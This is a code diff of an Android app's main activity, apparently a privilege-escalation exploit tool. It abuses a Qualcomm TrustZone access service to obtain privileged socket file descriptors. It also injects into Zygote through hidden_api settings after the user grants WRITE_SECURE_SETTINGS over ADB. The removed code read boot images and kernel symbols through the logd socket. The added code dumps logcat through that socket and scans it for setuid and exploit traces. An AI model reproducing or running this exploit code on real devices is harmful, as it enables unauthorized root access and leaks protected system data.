@@ -44,7 +44,6 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public class MainActivity extends AppCompatActivity {
     private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
     private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
-
     private static final int PERMISSION_REQUEST_CODE = 100;
     private static final String HIDDEN_API_BLACKLIST_EXEMPTIONS = "hidden_api_blacklist_exemptions";
     private static final String HIDDEN_API_POLICY = "hidden_api_policy";
@@ -186,7 +185,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeFullTest() {
         isTesting.set(true);
-        appendLog("========== CHECKING WRITE_SECURE_SETTINGS ==========");
+        appendLog("========== PHASE 1: WRITE_SECURE_SETTINGS CHECK ==========");
         boolean hasSecure = checkAndGuideSecureSettings();
 
         if (hasSecure) {
@@ -196,11 +195,11 @@ public class MainActivity extends AppCompatActivity {
             appendLog("WRITE_SECURE_SETTINGS NOT granted. Skipping Zygote injection.");
         }
 
-        appendLog("========== DIRECT ZYGOTE SOCKET CONNECTION ==========");
+        appendLog("========== PHASE 2: DIRECT ZYGOTE SOCKET CONNECTION ==========");
         attemptDirectZygoteConnection();
 
-        appendLog("========== DUMP FILES VIA LOGD ==========");
-        dumpFilesViaLogd();
+        appendLog("========== PHASE 3: LOGD LOG EXTRACTION ==========");
+        fetchLogdLogcat();
 
         appendLog("========== ALL TESTS COMPLETED ==========");
         updateStatus("Done");
@@ -241,7 +240,7 @@ public class MainActivity extends AppCompatActivity {
                 .setTitle("WRITE_SECURE_SETTINGS 権限が必要")
                 .setMessage("この権限はシステム権限のため、通常の許可ダイアログでは取得できません。\n\n" +
                             "PC に接続し、以下の ADB コマンドを実行してください：\n\n" +
-                            "adb shell pm grant " + getPackageName() + 
+                            "adb shell pm grant " + getPackageName() +
                             " android.permission.WRITE_SECURE_SETTINGS\n\n" +
                             "実行後、アプリを再起動してください。")
                 .setPositiveButton("OK", null)
@@ -271,7 +270,7 @@ public class MainActivity extends AppCompatActivity {
             String oldPolicy = Settings.Global.getString(cr, HIDDEN_API_POLICY);
             Settings.Global.putString(cr, HIDDEN_API_POLICY, "1");
             Settings.Global.putString(cr, HIDDEN_API_POLICY, oldPolicy != null ? oldPolicy : "");
-            appendLog("Triggered Zygote update. Check if a root process appeared.");
+            appendLog("Triggered Zygote update.");
 
             Settings.Global.putString(cr, HIDDEN_API_BLACKLIST_EXEMPTIONS, "");
             appendLog("Cleared setting to avoid persistence.");
@@ -317,43 +316,56 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void dumpFilesViaLogd() {
+    private void fetchLogdLogcat() {
         String logdPath = "/dev/socket/logd";
         if (!tryConnect(logdPath)) {
-            appendLog("logd not available, skipping file dumps");
+            appendLog("logd not available, cannot fetch logcat");
             return;
         }
-        String[] targets = {"/dev/bootimg", "/proc/kallsyms"};
-        for (String filePath : targets) {
-            if (stopRequested.get()) break;
-            appendLog("Dumping " + filePath + " via logd...");
-            ParcelFileDescriptor pfd = null;
-            try {
-                int[] iArr = new int[1];
-                pfd = mRemoteService.a(logdPath, iArr);
-                if (pfd == null) continue;
-                java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-                if (fdesc == null || !fdesc.valid()) { pfd.close(); continue; }
-                OutputStream os = new FileOutputStream(fdesc);
-                InputStream is = new FileInputStream(fdesc);
-                String cmd = "cat " + filePath + "\n";
-                os.write(cmd.getBytes(StandardCharsets.UTF_8));
-                os.flush();
-                String resp = readWithTimeout(is, 2000);
-                if (resp != null && !resp.isEmpty() && !resp.contains("No such file") && !resp.contains("Permission denied")) {
-                    File out = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), new File(filePath).getName() + ".txt");
-                    try (FileOutputStream fos = new FileOutputStream(out)) {
-                        fos.write(resp.getBytes(StandardCharsets.UTF_8));
-                    }
-                    appendLog("  Saved to " + out.getAbsolutePath());
-                } else {
-                    appendLog("  No valid content.");
-                }
-                pfd.close();
-            } catch (Exception e) {
-                appendLog("  Error: " + e.getMessage());
-                if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
+        appendLog("Fetching logcat via logd socket...");
+        ParcelFileDescriptor pfd = null;
+        try {
+            int[] iArr = new int[1];
+            pfd = mRemoteService.a(logdPath, iArr);
+            if (pfd == null) {
+                appendLog("  Failed to get logd FD");
+                return;
             }
+            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
+            if (fdesc == null || !fdesc.valid()) {
+                appendLog("  FD invalid");
+                pfd.close();
+                return;
+            }
+            OutputStream os = new FileOutputStream(fdesc);
+            InputStream is = new FileInputStream(fdesc);
+            String cmd = "logcat -d\n";
+            os.write(cmd.getBytes(StandardCharsets.UTF_8));
+            os.flush();
+            String logcat = readWithTimeout(is, 3000);
+            if (logcat != null && !logcat.isEmpty()) {
+                appendLog("  logcat received (length: " + logcat.length() + ")");
+                File logFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "logcat_dump.txt");
+                try (FileOutputStream fos = new FileOutputStream(logFile)) {
+                    fos.write(logcat.getBytes(StandardCharsets.UTF_8));
+                }
+                appendLog("  Full logcat saved to " + logFile.getAbsolutePath());
+                String[] keywords = {"Zygote", "SystemServer", "setuid", "setgid", "runtime-init", "exploit", "Permission denied"};
+                for (String kw : keywords) {
+                    if (logcat.contains(kw)) {
+                        appendLog("  Found keyword '" + kw + "' in logcat");
+                        int start = logcat.indexOf(kw);
+                        int end = Math.min(start + 200, logcat.length());
+                        appendLog("  Context: " + logcat.substring(start, end).replace("\n", "\\n"));
+                    }
+                }
+            } else {
+                appendLog("  No logcat output received");
+            }
+            pfd.close();
+        } catch (Exception e) {
+            appendLog("  Error fetching logcat: " + e.getMessage());
+            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
         }
     }
 
